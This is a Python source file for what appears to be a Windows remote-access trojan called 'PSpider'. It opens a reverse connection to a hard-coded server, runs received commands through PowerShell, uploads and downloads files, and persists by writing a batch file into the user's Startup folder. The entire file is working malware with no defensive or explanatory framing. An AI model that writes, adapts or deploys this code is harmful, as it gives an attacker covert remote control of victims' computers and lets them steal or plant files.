import socket
import subprocess
from pathlib import Path
import time
import os

BUFFER_SIZE = 4096
HOST = '192.168.1.134'  # Server IP here
PORT = 12345
SPAWN = os.getcwd()

cwd = SPAWN

# Execute commands by calling powershell
def runCommand(command, client_socket):
    with subprocess.Popen(["powershell", "-Command", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE) as process:
        
        while True:
            chunk = process.stdout.read(BUFFER_SIZE)
            if not chunk:
                break

            client_socket.send(chunk)

            data = client_socket.recv(BUFFER_SIZE)
            if data != b"OK":
                break
            
        error = b''
        for error_line in process.stderr:
            error += error_line
    if error != b'':
        client_socket.send(error)
    
        data = client_socket.recv(BUFFER_SIZE)
        
    return_code = process.wait()
    if return_code != 0:
        print(f"Process failed with return code {return_code}")
    
    client_socket.send(b"Fin")

# Change working directory
def changeDir(command, cwd):
    if command[1] == "..":
        new_cwd = cwd.rsplit('\\', 1)[0]
        try:
            os.chdir(new_cwd)
            cwd = new_cwd
        except Exception as e:
            print(e)
    else:
        try:
            os.chdir(command[1])
            cwd = os.getcwd()
        except Exception as e:
            print(e)
            
    return cwd

# Add this program to startup
def addToStartup():
    try:
        startup_is = False
        login = os.getlogin()
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % login
        file_path = SPAWN
            
        with open(bat_path + '\\' + "PSpider.bat", "w+") as bat_file:
            bat_file.write(r'start "" "%s"' % file_path)
        startup_is = True
        return startup_is
    except:
        return False

# Upload file to server
def download(proc_command, client_socket):
    file_name = proc_command[1]

    client_socket.send(b"OK")

    response = client_socket.recv(BUFFER_SIZE)
    command = response.decode()

    if command == "Error":
        return 1

    if '\\' in file_name:
        file_name = file_name.rsplit('\\', 1)[0]

    try:
        st = os.stat(proc_command[1])
        file_size = st.st_size
        
    except FileNotFoundError:
        client_socket.send(b"Error")
        
        return 1
        
    chunks = str(int(file_size / BUFFER_SIZE))
    client_socket.send(chunks.encode())

    data = client_socket.recv(BUFFER_SIZE).decode()

    if data != "OK":
        return 1

    runCommand(command, client_socket)

# Receive file from server
def upload(proc_command, client_socket):
    
    chunk = client_socket.recv(BUFFER_SIZE)
    
    with open(proc_command[1], 'wb') as output_file:
        while chunk != b"Fin":
            output_file.write(chunk)
            client_socket.send(b"OK")
            
            chunk = client_socket.recv(BUFFER_SIZE)

def main():
    while True:
        empty_buffer = 0
        
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((HOST, PORT))

            client_socket.send(SPAWN.encode())
            cwd = SPAWN

            while True:
                
                raw_command = client_socket.recv(BUFFER_SIZE).decode()
                if raw_command == "":
                    empty_buffer += 1
                    if empty_buffer > 10:
                        break
                else:
                    empty_buffer = 0
                
                proc_command = raw_command.split(' ', 1)
                
                if raw_command == "q" or raw_command == "quit":
                    print("Server disconnected.")
                    break

                elif raw_command == "startup":
                    status = addToStartup()
                    if status: 
                        client_socket.send(b"Success.")
                        
                    else:
                        client_socket.send(b"Failed.")

                elif proc_command[0] == "mkdir" or proc_command[0] == "rmdir" or proc_command[0] == "rm":
                    runCommand(raw_command, client_socket)

                elif proc_command[0] == "dir":
                    runCommand(raw_command, client_socket)
                    
                elif proc_command[0] == "cd":
                    cwd = changeDir(proc_command, cwd)
                    client_socket.send(cwd.encode())
                    
                elif proc_command[0] == "gc":
                    runCommand(raw_command, client_socket)
                    
                elif proc_command[0] == "download" or proc_command[0] == "dl":
                    download(proc_command, client_socket)
                
                elif proc_command[0] == "upload" or proc_command[0] == "ul":
                    upload(proc_command, client_socket)

            client_socket.close()
            
        except (ConnectionRefusedError, TimeoutError):
            pass
        except (ConnectionAbortedError, ConnectionResetError):
            client_socket.close()
            cwd = SPAWN
            print("Server has disconnected.")
            
        finally:
            time.sleep(3)
            
main()